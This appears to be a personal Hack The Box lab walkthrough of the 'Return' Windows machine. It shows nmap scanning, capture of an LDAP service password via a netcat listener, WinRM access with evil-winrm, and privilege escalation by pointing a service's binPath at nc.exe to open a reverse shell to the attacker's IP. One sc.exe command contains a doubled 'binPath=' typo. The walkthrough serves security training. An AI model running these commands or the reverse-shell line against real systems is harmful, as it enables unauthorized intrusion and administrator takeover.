![[Pasted image 20250419002920.png]]
Enumerating with [[nmap]] we got this ports and this services. we check the web page of [[port 80]]
![[Pasted image 20250419003313.png]]
if we use [[netcat (nc)]] to listen on port `389` and change the server address for our `ip address`
![[Pasted image 20250419003437.png]]
we receive some that looks like a password.
`svc-printer:1edFg43012!!`

now, we can check [[port 445]] with [[netexec]] can enumerate things.

```bash
netexec smb 10.10.11.108
```

![[Pasted image 20250419003919.png]]

 u can validate if the credentials are valid.
 
![[Pasted image 20250419021456.png]]

first can check with `netexec` if user `svc-printer` are in group `Remote Management Users`

```bash
netexec winrm -i 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
```

![[Pasted image 20250419022120.png]]
if the output says `(Pwn3d!)` and the target has [[port 5985]] open, so we can use tools as [[evil-winrm]] to try get a interactive shell with the credentials of `svc-printer`

```bash
evil-winrm -i 10.10.11.108 -u svc-printer -p 1edFg43012!!
```

![[Pasted image 20250419022424.png]]
we are in.

Enumerating information about the user `svc-printer`
![[Pasted image 20250419023752.png]]
we see are in group [[Server Operators]] that allows us start and stop services, so list the services with `services` command.
![[Pasted image 20250419024221.png]]
we can upload [[nc.exe]] to after try establish a connection as administrator with our machine.

```powershell
upload /home/entr0phy4/Desktop/hackthebox/Return/executables/nc.exe
```
![[Pasted image 20250419025723.png]]
now with [[sc.exe]] can modify a existent service to change the binPath to aim `nc.exe`.

```powershell
sc.exe config VMTools binPath="binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd 10.10.16.2 9001"
```

if we receive `[SC] ChangeServiceConfig SUCCESS` the binPath are changed successful
first start to listen on the port `9001`, after stop and start again the service selected.

![[Pasted image 20250419030323.png]]
and we got the administrator privileges. 